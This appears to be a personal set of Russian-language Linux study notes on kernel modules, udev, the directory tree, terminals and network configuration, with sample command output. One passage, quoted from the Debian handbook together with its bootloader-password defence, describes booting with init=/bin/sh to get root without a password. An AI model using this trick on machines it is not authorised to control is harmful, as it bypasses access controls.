 ICMP пакт с сообщением "TTL истекло" и его IP адр 192.168.100.1, 100.123.128.1...
Pinging HABR.ru [178.248.233.33] with 32 bytes of data:
Reply from 100.123.128.1: TTL expired in transit.


clear // очищает экран.
history // выводит содержимое истории команд - содержимое .bash_history
history | grep ping //найти в history все команды с ping
!123 // - повтор команды c №123 из history




 = = = ЯДРО Linux Система каталогов = = = 
Использование оболочки в качестве init для получения привилегий root (обход Безопасности!)
https://debian-handbook.info/browse/ru-RU/stable/unix-services.html#sect.systemd
Любой человек, способный получить доступ к компьютеру, может нажать кнопку Reset и перезагрузить его.
 Потом, в приглашении загрузчика, можно передать ядру опцию init=/bin/sh, чтобы получить доступ root,
 не зная пароля администратора.!!  ПРОВЕРИТЬ!!!
Чтобы предотвратить это, можно защитить паролем загрузчик. Следует также задуматься о защите доступа к BIOS (механизм защиты паролем почти всегда доступен).

ls /usr/src/linux-headers-5.15.0-75-generic/ - исходные коды ядра linux

//Кетов Видео Сетевые интерфейсы и статическая маршрутизация.mp4 
ЯДРО - суть ПО (программа, не процесс) в Оперативная память в работающей PC!
 Я:!!!@ядро Linux выполняет функции управления оперативной памятью PC, управления процессами,
 доступа к периферийным устройствам (дискам, клав., шинам, контроллерам шин, портам/ в т.ч сети) и
 создания, изменения прав, доступа (и др.операции) к файлам/каталогам  в  корневой файл системе и прсевдофайловым системам. 
 В т.ч. изменение свойств файлов - владельца, группы владельца и др информацмм ,
  записанной в inode  файла - все операции выполянются "через" ядро.

vmlinuz -  сжатый файл образа ядра Linux для загрузки ОС Linux.
initrd - это временная корневая файловая система, загружаемая в память в процессе загрузки 
 до того, как будет смонтирована фактическая корневая файловая система.
 Все части программы ядра Linux ("21. Ядро Linux — Основы GNU_Linux")работают в одной 
 части адр.пространства. 
 Ядро Linux  является:
 1)  "Монолитным"- Все что делает ядро - выполяняется в рамках одно программы!
 "Linux ядро монолитное, т.е. все его драйвера и подсистемы работают в своем адресном
  пространстве, отделенном от пользовательского.  Монолитное — значит что ядро не поделено на части. Монолитное ядро противопоставляется  микроядерным — Minix и HURD, где каждый отдельный сервис — это отдельный процесс,
  а «истинное» микроядро лишь занимается обменом между информации между ними"
 https://habr.com/ru/articles/117654/
 2) "Модульным" - оборащения к устройствами или спец операция (например шифрования)
    выполяняется через модули (драйверы) двух типов:
 2.1) .ko -  содержащиеся в файле ядра vmlinuz (скомпилированные в нем). 
   находятся в /lib/modules/`uname -r`/kernel/fs/fat/msdos.ko
   К слову, разные дистрибутивы Linux отличаются набором включенных в файл ядра модулей .ko
   при компиляции файла ядра. В т.ч в связи с этим, а также для оптимизации для различных платформ
   и подготавливаются разные дистрибутивы.
   Список модулей, встроенных в ядро
   less /usr/lib/modules/5.15.0-75-generic/modules.builtin
   Модули .ko нельзя выгрузить из ядра
 2.2) .mod - отдельные файлы, содержащиеся в /usr/lib/grub/i386-pc/, /usr/lib/grub/x86_64-efi/ 
  и загружаемые ядром в процессе работы при необходимости.
 2.2.1) В каталоге /etc/modules-load.d/ содержатся (можно добавить) конфигурационные файлы, определеяющие
   какие модули загружать при загрузке ядра.
  Например можно создать /etc/modules-load.d/radion.conf (содержащий алиас драйвера mod "radion"), и он 
  будет загружаться автоматически в ядро
 2.2.2)   В каталоге /etc/modprobe.d/ конфигур файлы с детализированными параметрами для
   для загрузки модулей, в т.ч 
 2.2.2а) Какие модули должны ЗАГРУЖАЛСЯ С ОПРЕД ПАРАМЕТРАМИ
  ЧИТАЙ https://wiki.archlinux.org/title/Kernel_module "4.2 Using files in /etc/modprobe.d/" 
  Нрпvр cat /etc/modprobe.d/mdadm.conf  
          options md_mod start_ro=1 // параметры загрузки md дисков
 2.2.2b) КАКИЕ МОДУЛИ НЕ ДОЛЖНЫ ЗАГРУЖАТЬСЯ (Например, запретить  присоединение устройств по
    USB или протоколы модемов и сетей)
  Файл /etc/modprobe.d/blacklist-rare-network.conf  - список заблокированных призагрузке ядра 
   драйверов сетей, чтобы обычные пользователи не могли использователь.
   Но root всегда может их пристыковать к ядру 
  cat /etc/modprobe.d/blacklist-rare-network.conf 
   # x25
   alias net-pf-9 off

Список псевдонимов модуей (с ними работает программа modprob)
less /usr/lib/modules/5.15.0-75-generic/modules.alias 

     <=> modprob (подробно см ниже в файле, раздел про драйвера Ketov) <=> 
modprob name.mod  - загрузить / выгрузить (-r) модуль из ядра.
!Перед выгрузкой необходимо остановить процесс, использующий модуль!
Прогррамма modprob 
ls /sys/  - структурированная файловая система об устройствах и драйверах
lscpu lspci и др берут информацию из /sys/

                  * * Местро хранения программы ядра * *
ll /boot/ // на моем PC - 3 три разных файла программы ядра, было 2 обновления ядра после установки
drwxr-xr-x  5 root root      4096 окт 28 19:02 ./
drwxr-xr-x 19 root root      4096 мая 17 23:30 ../
-rw-r--r--  1 root root 126235870 окт 28 18:51 initrd.img-5.15.0-56-generic
-rw-r--r--  1 root root 127482136 окт 28 19:01 initrd.img-5.15.0-75-generic
-rw-r--r--  1 root root 126145561 окт 28 19:02 initrd.img-5.15.0-87-generic
drwxr-xr-x  3 root root      4096 мар 11  2023 kernel/
-rw-r--r--  1 root root  11551392 дек 18  2022 vmlinuz-5.15.0-56-generic
-rw-------  1 root root  11589544 июн  7 01:52 vmlinuz-5.15.0-75-generic
-rw-------  1 root root  11621768 окт  2 22:42 vmlinuz-5.15.0-87-generic

  = ^ = Ядро, демон udev создание файла устройства и загрузка драйверов = ^ = 
https://www.youtube.com/watch?v=zvk0NNrDTow&t=123s
При подключении нового физ. устройства ядро обраруживает это устройство через диспетчер устройств
  (читай ниже как), ядро формирует сигналы (видны через sudo dmesg -wH, sudo journalctl -ekf),
 которые отслеживает демон udevd. 
udevd,1)применяя правила /usr/lib/udev/rules.d/, создает или не создает (блокирует) файлы устройства
 в /sys/ и /dev/ Например, при подключении накопителя - создается файл /dev/sdb, /dev/sdb1 и/dev/sdb2
2) Эти файлы ядро связывает  с драйверами оборудования. Т.о. устройства становиться файлом, с которыми
можно работать!!! cм схему в файле "Linux Ядро Kernel Процессы и их свойства systemd grub ps top htop strace fstab mount.doc"

sudo dmesg -wH //realtime:сигналы ядра подключениz флешки с 4 разделами, 2 из которых raid массив
[окт29 16:11] usb 1-1: new high-speed USB device number 3 using ehci-pci
[  +0,613812] usb 1-1: New USB device found, idVendor=058f, idProduct=6387, bcdDevice= 1.00
[  +0,000004] usb 1-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
[  +0,000002] usb 1-1: Product: Mass Storage Device
[  +0,000001] usb 1-1: Manufacturer: JetFlash
[  +0,000001] usb 1-1: SerialNumber: 3GEH6B73
[  +0,003029] usb-storage 1-1:1.0: USB Mass Storage device detected
[  +0,001399] scsi host9: usb-storage 1-1:1.0
[  +1,032441] scsi 9:0:0:0: Direct-Access     JetFlash Transcend 4GB    8.07 PQ: 0 ANSI: 2
[  +0,001430] sd 9:0:0:0: Attached scsi generic sg8 type 0
[  +0,023846] sd 9:0:0:0: [sdf] 7843840 512-byte logical blocks: (4.02 GB/3.74 GiB)
[  +0,006881] sd 9:0:0:0: [sdf] Write Protect is off
[  +0,000006] sd 9:0:0:0: [sdf] Mode Sense: 03 00 00 00
[  +0,006124] sd 9:0:0:0: [sdf] No Caching mode page found
[  +0,000008] sd 9:0:0:0: [sdf] Assuming drive cache: write through
[  +0,172047]  sdf: sdf1 sdf2 sdf3 sdf4
[  +0,035410] sd 9:0:0:0: [sdf] Attached SCSI removable disk
[  +2,535831] md22: WARNING: sdf1 appears to be on the same physical disk as sdf2.
[  +0,000004] True protection against single-disk failure might be compromised.
[  +0,000061] md/raid1:md22: active with 2 out of 2 mirrors
[  +0,000012] md22: detected capacity change from 0 to 2093056
[ +15,376381] FAT-fs (sdf4): Volume was not properly unmounted. Some data may be corrupt. Please run fsck.

  = ^ = END Ядро, udev создание файла устройства и загрузка драйверов = ^ = 



https://losst.pro/ctruktura-fajlovoj-sistemy-linux?ysclid=le05weurjy208538342
https://www.youtube.com/watch?v=WL2Xbndqy0k&list=PLXR11-5Ez3ipiEybu4j8n6SINoMaGc8Rf&index=7
https://www.youtube.com/watch?v=dWjo7HzRh1E&list=PLXR11-5Ez3ipiEybu4j8n6SINoMaGc8Rf&index=6&t=2379s

  = = = = = Дерево каталогов = = = = 
см "man hier" !
Дерево каталогов - ЕСТЬ Интерфейс доступа к информации (файлам) в файловых системах (в т.ч. псевдофайловых proc dev sys) UNIX.
Дерево каталогов - структура каталогов/файлов на основной (КОРНЕВОЙ) файловой системе (ext 2 - ext4 и др ОС семейства UFS). К КОРНЕВОЙ файловой системе монтируются остальные файловые системы Linux
Дерево каталогов может состоять из различных файловых систем. Так каалоги var cache home лучше выносить на отдельный тоm/файловыую систему
Кeтов
/ - корень  есть начало файловой система Linux. Только пользователь root имеет право читать и изменять файлы в этом каталоге
/root -  домашний каталог пользователя root
!!! каталоги /bin, /sbin, /lib, /lib32, /lib64 в linux являются !! ССЫЛКАМИ на /usr/bin,/usr/sbin/, /usr/lib, /usr/lib32, /usr/lib64 (подсвечиваются салатовым)  для обрабной совместимости с POSIX стандатром UNIX
/bin - (binaries) бинарные файлы пользователя. каталог содержит исполняемые ДВОИЧНЫЕ файлы. Здесь расположены программы, которые можно использовать в однопользовательском режиме или режиме восстановления. Одним словом, те утилиты, которые могут использоваться пока еще не подключен каталог /usr/. Это такие общие команды, как cat, ls, tail, ps и т д.

/sbin - (system binaries) системные исполняемые файлы ДЛЯ СУПЕРПОЛЬЗОВАТЕЛЯ SU root и для sudoers. Так же как и /bin, содержит двоичные исполняемые файлы, которые доступны на ранних этапах загрузки, когда не примонтирован каталог /usr. Но здесь находятся программы, которые можно выполнять только с правами суперпользователя. Это разные утилиты для обслуживания системы. Например, iptables, reboot, fdisk, ifconfig,swapon и т д.

/etc - (etcetera) конфигурационные файлы. Содержатся конфигурационные файлы всех программ, установленных в системе. Кроме конфигурационных файлов, в системе инициализации Init Scripts, здесь находятся скрипты запуска и завершения системных демонов, монтирования файловых систем и автозагрузки программ. Структура каталогов linux в этой папке может быть немного запутанной, но предназначение всех их - настройка и конфигурация.

/dev - (devices) файлы устройств. В UNIX/Linux !ВСЕ ВСЕ!, в том числе внешние устройства являются файлами  ПСЕВДОфайловой системы dev. Таким образом, все подключенные флешки, клавиатуры, микрофоны, камеры - это просто файлы в каталоге /dev/. Этот каталог содержит не совсем обычную файловую систему. Структура файловой системы Linux и содержащиеся в папке /dev файлы инициализируются при загрузке системы, сервисом udev. Выполняется сканирование всех подключенных устройств и создание для них специальных файлов. Это такие устройства, как: /dev/sda, /dev/sr0, /dev/tty1, /dev/usbmon0 и т д.
  "В современных ядрах при подключении оборудования модули подключаются автоматически, а это событие обрабатывается демоном udevd, который создает соответствующий файл устройства в каталоге "/dev". Все это выполняется в том случае, если соответствующий модуль корректно установлен в дерево модулей. В случае с файловыми системами ситуация та же: при попытке монтирования файловой системы ядро подгружает необходимый модуль автоматически, и выполняет монтирование. https://habr.com/ru/post/117654/"

/proc - (proccess) информация о процессах.Это тоже необычная файловая система (procfs!), а подсистема, !динамически! создаваемая ядром. Здесь содержится вся !информация о запущенных процессах в реальном времени!.Это ПСЕВДОфайловая система, содержащая подробную информацию о каждом процессе, его Pid, имя исполняемого файла, параметры запуска, доступ к оперативной памяти и так далее. Также здесь можно найти информацию об использовании системных ресурсов, например, /proc/cpuinfo, /proc/meminfo или /proc/uptime. Кроме файлов в этом каталоге есть большая структура папок linux, из которых можно узнать достаточно много информации о системе. Отсюда берется инфа для top htop

/var (variable) - Переменные файлы. Cодержать файлы, которые часто изменяются. Размер этих файлов постоянно увеличивается. Здесь содержатся файлы системных журналов (логи), различные кеши(загрузки web-страниц, очереди печати!! ), базы данных и так далее. Дальше рассмотрим назначение каталогов Linux в папке /var.НЕ УДАЛЯЕТСЯ ПОСЛЕ ПЕРЕЗАГРУЗКИ
/var/log - Файлы логов всех программ, установленных в операционной системе. У многих программ есть свои подкаталоги в этой папке, например, /var/log/apache - логи веб-сервера, /var/log/squid - файлы журналов кеширующего сервера squid. Если в системе что-либо сломалось, скорее всего, ответы вы найдете здесь.
/var/lib - базы данных Еще один тип изменяемых файлов - это файлы баз данных, пакеты, сохраненные пакетным менеджером и т д.
/var/mail - почта В эту папку почтовый сервер складывает все полученные или отправленные электронные письма, здесь же могут находиться его логи и файлы конфигурации.
/var/spool - очереди Изначально, эта папка отвечала за очереди печати на принтере и работу набора программ cups.
/var/lock - файлы блокировок. Эти файлы означают, что определенный ресурс, файл или устройство занят и не может быть использован другим процессом. Apt-get, например, блокирует свою базу данных, чтобы другие программы не могли ее использовать, пока программа с ней работает.
/var/run - PID процессов. Содержит файлы с PID процессов, которые могут быть использованы, для взаимодействия между программами. В отличие от каталога /run данные !сохраняются! после перезагрузки!!!

/tmp (temp) - Временные файлы В этом каталоге содержатся временные файлы, созданные системой, любыми программами или пользователями. Все пользователи имеют право записи в эту директорию. 
 Файлы!УДАЛЯЮТСЯ! при каждой перезагрузке!!! Аналогом Windows является папка Windows\Temp

/usr - (user applications) Программы пользователя Этот  каталог ПОВТОРЯЕТ ИЕРАРХИЮ КОРНЕВОГО, с большим количеством функций. Тут наиболее большая структура каталогов Linux. Здесь находятся исполняемые бинарные двоичные файлы, исходники программ, различные ресурсы приложений, картинки, музыку и документацию.
/usr/bin/ - Исполняемые файлы  Содержит исполняемые файлы различных программ, которые не нужны на первых этапах загрузки системы, например, музыкальные плееры, графические редакторы, браузеры и так далее.
/usr/sbin/ Содержит двоичные файлы программ для системного администрирования, которые нужно выполнять с правами root/суперпользователя. Например, таких как Gparted, sshd, useradd, userdel и т д.
/usr/lib/ - Библиотеки Содержит библиотеки для программ из /usr/bin или /usr/sbin.
/usr/local - Файлы пользователя. Содержит файлы программ, библиотек, и настроек созданные пользователем. Например, здесь могут храниться программы собранные и установленные из исходников/исходного кода  и скрипты, написанные вручную.
/usr/share - архитектуро независимые файлы - в т.ч ярлыки темы значки справочникаи tхt

/home - Домашняя папка
В этой папке хранятся домашние каталоги всех пользователей. В них они могут хранить свои личные файлы, настройки программ и т д. 
 Например, /home/sergiy и т д. Если сравнивать с Windows, то это ваша папка пользователя н
 а диске C, но в отличии от WIndows, home как правило размещается на отдельном разделе!! поэтому
  при переустановке системы все ваши данные и настройки программ сохранятся.
  см 24. Работа с файловыми системами — Основы GNU - перенос /home на др. диск,FS
/boot - Файлы загрузчика
Содержит все файлы, связанные с загрузчиком системы. Это ЯДРО! vmlinuz, образ 
 initrd/initramfs (иницализирует RAM disk - ЧИТАЙ doc-файл), а также файлы загрузчика, 
 находящие в каталоге /boot/grub.
file vmlinuz-5.15.0-56-generic
vmlinuz-5.15.0-56-generic: Linux kernel x86 boot executable bzImage, version 5.15.0-56-generic (buildd@lcy02-amd64-004) #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022, RO-rootFS, swap_dev 0XA, Normal VGA

Различия initrd vs initramfs
https://stackoverflow.com/questions/10603104/the-difference-between-initrd-and-initramfs
initrd (начальный RAMдиск) — это схема загрузки временной корневой файловой системы в память,
 которая будет использоваться как часть процесса запуска Linux. 
initrd и initramfs (INITial RAMFS) относятся к двум различным методам достижения этой цели.
 Оба обычно используются для подготовки к монтированию настоящей корневой файловой системы.
1)Старый метод  Initial ramdisk (initrd):действует как блочное устройство, поэтому ему требуется
 драйвер файловой системы (нпр, ext2). Ядро должно иметь хотя бы один встроенный модуль для 
определения файловой системы initrd. initrd - Это блочное устройство на базе оперативной памяти,
 то есть моделируемый жесткий диск, который использует память вместо физических дисков.
Файл initrd считывается и разархивируется на устройство, как если бы вы делали 
  zcat initrd | dd of=/dev/ram0 или что-то подобное.
В initrd содержится образ файловой системы, поэтому теперь вы можете смонтировать файловую систему
  как обычно: mount /dev/ram0 /root. Естественно, для fs нужен драйвер, поэтому, если вы 
 используете ext2, драйвер ext2 должен быть скомпилирован в ядре.
2) Современный метод:  initramfs монтируется в  tmpfs (mount -t tmpfs nodev /root).
Для tmpfs не нужен драйвер!, он всегда находится в ядре!. Устройство не требуется,+никаких 
доп.драйверов. Initramfs распаковывается непосредственно в эту новую файловую систему:
  zcat initramfs | cpio -i или анал-но.


!!! 07-05-2023 Я: в /boot монтриуется при загрузке (согласно  /etc/fstab ) раздел EFI /dev/sda3  vfat
см 
1) cat /etc/fstab
# /boot/efi was on /dev/sda3 during installation
UUID=9DCA-6AA1  /boot/efi       vfat    umask=0077      0       1
end  !!! 07-05-2023 Я
2)findmnt
└─/boot/efi                   /dev/sda3  vfat

/lib (library) - Системные библиотеки Содержит файлы системных библиотек, которые используются исполняемыми файлами в каталогах /bin и /sbin.
Библиотеки имеют имена файлов с расширением *.so и начинаются с префикса lib*. Например, 
libncurses.so.5.7. Папка /lib64 в 64 битных системах содержит 64 битные версии библиотек из /lib. 
Эту папку можно сравнить с WIndows\system32, там тоже загружены все библиотеки системы (*.dll), 
 только там они лежат смешанные с исполняемыми файлами, а здесь все отдельно.
// Кетов видео web1: файлы *.so - SharedObject = аналог библиотек dll, загружаются в процесс, являются зачастую "плагинами" 

/opt (Optional applications) - Дополнительные программы. Устанавливаются проприетарные программы
  Opera Chrome, игры или драйвера. Это программы созданные в виде отдельных исполняемых 
файлов самими производителями. Такие программы устанавливаются в под-каталоги /opt/, 
они очень похожи на программы Windows, все исполняемые файлы, библиотеки и файлы конфигурации
 находятся в одной папке. Также сюда устанавливаются портейбл /переносимые программы.

/mnt (mount) - Монтирование .В этот каталог системные администраторы!!! могут монтировать внешние или дополнительные файловые системы. Сейчас редко испол-ся

/media - Съемные носители.В этот каталог система монтирует все подключаемые внешние накопители - USB флешки, оптические диски и другие носители информации.

/srv (server) - Сервер.Каталог создавался для файлов серверов и сервисов. Например, могут содержаться файлы веб-сервера apache. РЕДКО используется сейчас

/run - процессы. Еще один каталог, содержащий PID файлы процессов, похожий на /var/run, но в отличие от него, он размещен в TMPFS!!!, а поэтому после перезагрузки все файлы теряются!!!!!!

/sys (system) - Информация о системе. Назначение каталогов Linux из этой папки - получение информации о системе непосредственнАЯ от ядра Linux. Это еще одна файловая система организуемая ядром (ПСЕВДОФАЙЛОВАЯ СИСТЕМА) и позволяющая просматривать и изменить многие параметры работы системы, например, работу swap, t CPU? контролировать вентиляторы и многое другое.

ЕЩЕ ОДНО ОПИСАНИЕ  структуры корневой файловой системы
https://help.ubuntu.ru/wiki/%D1%80%D0%B0%D0%B7%D0%B4%D0%B5%D0%BB%D1%8B_%D0%B8_%D1%84%D0%B0%D0%B9%D0%BB%D0%BE%D0%B2%D1%8B%D0%B5_%D1%81%D0%B8%D1%81%D1%82%D0%B5%D0%BC%D1%8B_linux 
Директория	Описание
/	Корневая директория, содержащая всю файловую иерархию.
/bin/	Основные системные утилиты, необходимые как в однопользовательском режиме, так и при обычной работе всем пользователям (например: cat, ls, cp).
/boot/	Загрузочные файлы (в том числе файлы загрузчика, ядро и т.д.). Часто выносится на отдельный раздел.
/dev/	Основные файлы устройств системы (например физические устройства sata винчестеры /dev/sda, видео камеры или TV-тюнеры /dev/video или псевдоустройства, например «чёрные дыры» /dev/null, /dev/zero ).
/etc/	Общесистемные конфигурационные файлы, лежат в корне директории и файлы конфигурации установленных программ (имя происходит от et cetera).
/etc/X11/	Файлы конфигурации X Window System версии 11.
/etc/apt/	Файлы конфигурации пакетного менеджера Apt.
/etc/samba/	Файлы конфигурации сервера Samba, расшаривающего файлы по сети с windows машинами.
/home/	Содержит домашние директории пользователей, которые в свою очередь содержат персональные настройки и данные пользователя. Часто размещается на отдельном разделе.
/lib/	Основные библиотеки, необходимые для работы программ из /bin/ и /sbin/.
/media/	Точки монтирования для сменных носителей, таких как CD-ROM, DVD-ROM, flash дисков.
/opt/	Дополнительное программное обеспечение.
/proc/	Виртуальная файловая система, представляющая состояние ядра операционной системы и запущенных процессов в виде каталогов файлов.
/root/	Домашняя директория пользователя root.
/sbin/	Основные системные программы для администрирования и настройки системы, например, init, iptables, ifconfig.
/srv/	Данные, специфичные для окружения системы.
/tmp/	Временные файлы (см. также /var/tmp).
/usr/	Вторичная иерархия для данных пользователя; содержит большинство пользовательских приложений и утилит, используемых в многопользовательском режиме. Может быть смонтирована по сети только для чтения и быть общей для нескольких машин.
/usr/bin/	Дополнительные программы для всех пользователей, не являющиеся необходимыми в однопользовательском режиме.
/usr/include/	Стандартные заголовочные файлы.
/usr/lib/	Библиотеки для программ, находящихся в /usr/bin/ и /usr/sbin/.
/usr/sbin/	Дополнительные системные программы (такие как демоны различных сетевых сервисов).
/usr/share/	Архитектурно-независимые общие данные.
/usr/src/	Исходные коды (например, здесь располагаются исходные коды ядра).
/usr/local/	Третичная иерархия для данных, специфичных для данного хоста. Обычно содержит такие поддиректории, как bin/, lib/, share/. Она пригодится, когда /usr/ используется по сети.
/var/	Изменяемые файлы, такие как файлы регистрации (log-файлы), временные почтовые файлы, файлы спулеров.
/var/cache/	Данные кэша приложений. Сюда скачиваются пакеты перед их установкой в систему, здесь же они какое-то время и хранятся
/var/lib/	Информация о состоянии. Постоянные данные, изменяемые программами в процессе работы (например, базы данных, метаданные пакетного менеджера и др.).
/var/lock/	Lock-файлы, указывающие на занятость некоторого ресурса.
/var/log/	Различные файлы регистрации (log-файлы).
/var/mail/	Почтовые ящики пользователей.
/var/run/	Информация о запущенных программах (в основном, о демонах).
/var/spool/	Задачи, ожидающие обработки (например, очереди печати, непрочитанные или неотправленные письма).
/var/tmp/	Временные файлы, которые должны быть сохранены между перезагрузками.
/var/www/	Директория веб-сервера Apache, всё что находится внутри транслируется им в интернет (конфигурация по-умолчанию)

Кетов "Основы Linux: дерево каталогов, файловые системы и файлы"  !!!!!!!!!!!!!!
минута 12, целесообразно (для серверных платформ linux) для повышения надежности и производительности выносить на отдельные разделы (файловые системы/диски) катлоги "дерева каталогов" корневой файловой системы  /home /tmp /usr /var (и огранизовывать для них резервирования на raid: /home и /usr (raid1, raid5) /tmp и /var (raid0). Саму корневую FS на raid1



ТЕРМИНАЛ/ПСЕВДОТЕРМИНАЛ
pts - псевдотерминал (например терминал/bash в !GUI!)
tty - "настоящий" CLI (Интерфейса командной строки) терминал, без GUI 
процессы запуска менеджера логина (xfce4-session) также запускаются через tty (см ниже - w)

ctrl+j перевод строки (Enter)
ctrl+h удалить строку (Backspace) 
ctrl+w удалить слово
ctrl+u удалить строку
ctrl+c штатное/корректное прерывание процесс
ctrl+\ аварийное прерывание процесс
ctrl+d завершение ввода в процесс

stty // change and print terminal line settings
stty -a
speed 38400 baud; rows 24; columns 80; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>;
eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R;
werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff
-iuclc -ixany -imaxbel iutfd
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt
echoctl echoke -flusho -extproc



               = = = = = = СЕТЕВЫЕ ПРОГРАММЫ ИНТЕРФЕЙСЫ = = = = = = = 
Для настройки Ip связности между VBox VM Linux и хост-машиной следует:
1) в VM Virtual BOX выбрать в настройках "сеть" VM "Тип подключения=Сетевой мост" (2й в списке)
2) В GIU в настройке интерфейса enp0s3 выбрать "DHCP" (для IP и DNS, 1й номер, !не! 2й по списку ) 
3) В GIU выключить и вкл enp0s3 
ПОМНИ: конфликт между настройками GIU (1 приоритет) и bash. !!

https://losst.pro/kak-zadat-ip-adres-v-linux Как задать ip адрес в Linux
https://losst.pro/komanda-ifconfig-primery-ispolzovaniya Команда ifconfig - примеры использования
https://setiwik.ru/kak-vklyuchit-ssh-v-linux-mint/ Как установить сервер Openssh в Linux Mint
https://site2go.ru/article/nastrojka-lokalnoj-seti-mezhdu-kompyuterom-i-virtualnoj-mashinoj-virtualbox-na-windows-10  Настройка сети между компьютером и virtualbox
https://losst.pro/ustanovka-ssh-ubuntu-16-04 Установка SSH в Ubuntu

http://www.redov.ru/kompyutery_i_internet/tcp_ip_arhitektura_protokoly_realizacija_vklyuchaja_ip_versii_6_i_ip_security/p15.php?ysclid=liksl0yvb5177837300#metkadoc3 ПРОДОЛЖИТЬ 07 06 2023!

		    = = утилиты ip, ifconfig, ifup, ifdown = = 
https://losst.pro/komanda-ifconfig-primery-ispolzovaniya
https://losst.pro/kak-zadat-ip-adres-v-linux?ysclid=lirjltnt62297197046

IP адреса с помощью утилиты ip Если вам не нужно настраивать статический ip КАЖДЫ РАЗ ПРИ ЗАГРУЗКЕ, а необходимо только ОДИН РАЗ задать ip адрес linux через терминал
sudo ip link set eth0 up
Сначала нужно изменить IP и маску сети:  
sudo ip addr add 192.168.0.65/255.255.255.0 dev eth0
sudo ip addr add/del 192.168.0.65/255.255.255.0 dev eth0/enps0
Затем добавить шлюз:  sudo ip route add default via 192.168.0.1
ip a // инф о  ВСЕХ интерфейсах
ip link set enp0s3 down / up # выключить /включить инт-фейс  !!!

ip -s -d -h address show enp0s3
ip -s -d -h link show enp0s3  # подробн инф-я о инт-се enp0s3, включая ошибки
1: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
    link/ether 08:00:27:30:1c:fd brd ff:ff:ff:ff:ff:ff promiscuity 0 minmtu 46 maxmtu 16110 addrgenmode none numtxqueues 1 numrxqueues 1 gso_max_size 65536 gso_max_segs 65535 parentbus pci parentdev 0000:00:03.0
    RX:  bytes packets errors dropped  missed   mcast
         5.44M   6.83k      0       0       0     678
    TX:  bytes packets errors dropped carrier collsns
         1.29M   3.38k      0       0       0       0

ip ro show или ip route show  # вывод таблицы маршрутизации
default via 192.168.100.1 dev enp0s3 proto dhcp metric 100
169.254.0.0/16 dev enp0s3 scope link metric 1000
192.168.100.0/24 dev enp0s3 proto kernel scope link src 192.168.100.10 metric 100

ip route show match 0/0 //маршрут по умолчанию
default via 10.250.0.1 dev enp0s3

ifconfig -a //список ВСЕХ интерфейсов ПОДРОБНО
ifconfig -s //список интерфейсов с минимальной информацией о них используйте опцию -s:
ifconfig eth0 // информацию про определенный интерфейс, например, про eth0:
ifconfig enp0s3 up / down // включить/откл-ть интерфейс используется команда ifconfig eth0 
ifconfig -v // подробную информацию об ошибках с помощью опции -v:

# выделить IP-адрес интер-са enp0s3
$(ifconfig enp0s3 | grep "inet 192" | awk '{print $2}') 

ifup ifdown - не работают в Mint на работе!!!
sudo ifup enp0s3
ifup: unknown interface enp0s3 !!!!
В то же время ifup ifdown используются в службе ядра  networking.service
systemctl status networking.service
 networking.service - Raise network interfaces
     Loaded: loaded (/lib/systemd/system/networking.service; enabled; vendor preset: enabled)
     Active: inactive (dead) since Wed 2023-06-21 19:17:10 +03; 17min ago
       Docs: man:interfaces(5)
    Process: 609 ExecStart=/sbin/ifup -a --read-environment (code=exited, status=0/SUCCESS)
    Process: 2882 ExecStop=/sbin/ifdown -a --read-environment --exclude=lo (code=exited, status=0/SUCCESS)
   Main PID: 609 (code=exited, status=0/SUCCESS)
также см в less /lib/systemd/system/networking.service;

      = =  =  = Настройка статического ip адреса, подсети, и шлюза  = = = = =   

!! Примеры настройки int СМОТРЕТЬ в less /usr/share/doc/ifupdown/examples/network-interfaces; найдено по "dpkg -S ifup" !!
sudo vi /etc/network/interfaces
auto lo
iface lo inet loopback
# iface enp24s0 inet dhcp
auto enp24s0
iface enp24s0 inet static
address 192.168.0.65
netmask 255.255.255.0
gateway 192.168.0.1

		   = = = = dhclient - настройка DHCP назначения адреса = = = = = =
dhclient // запустить dhcp для интерфейсов
dhclient -r // отозвать IP, полученные по dhcp 
ДО  netstat | grep bootpc
     udp        0      0 192.168.100.9:bootpc    192.168.100.1:bootps    ESTABLISHED
   ps ax |grep  dhc
    3884 ?        Ssl    0:00 dhclient
    4229 ?        Ssl    0:00 dhclient enp0s3
ПОСЛЕ  
   ps ax |grep  dhc
    3884 ?        Ssl    0:00 dhclient

sudo dhclient -4 -v enp0s3  //   Use the DHCPv4 protocol to obtain an IPv4 address and configuration  parameters. запустить службу DHCP,  получить IPv4 по dhcp от сервера 

sudo dhclient -v enp0s3  //   Enable verbose log messages dhcp 
Internet Systems Consortium DHCP Client 4.4.1
Listening on LPF/enp0s3/08:00:27:00:ce:95
Sending on   LPF/enp0s3/08:00:27:00:ce:95
Sending on   Socket/fallback
DHCPDISCOVER on enp0s3 to 255.255.255.255 port 67 interval 3 (xid=0x3ad03166)
DHCPOFFER of 192.168.100.11 from 192.168.100.1
DHCPREQUEST for 192.168.100.11 on enp0s3 to 255.255.255.255 port 67 (xid=0x6631d03a)
DHCPACK of 192.168.100.11 from 192.168.100.1 (xid=0x3ad03166)
bound to 192.168.100.11 -- renewal in 42462 seconds.

sudo dhclient -4 -r enp0s3 // отозвать для np0s3 ip adress, полуеннный по dhcpv4
Killed old client process
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/enp0s3/08:00:27:30:1c:fd
Sending on   LPF/enp0s3/08:00:27:30:1c:fd
Sending on   Socket/fallback
DHCPRELEASE of 192.168.100.4 on enp0s3 to 192.168.100.1 port 67 (xid=0x4702ccd3)
client_loop: send disconnect: Connection reset // соединение по ssh разорвано

После остановки dhcpclient/отзыва ip, полуеннного по dhcpv4
sudo ifconfig enp0s3 192.168.100.55/24 // установить статически ip адрес 
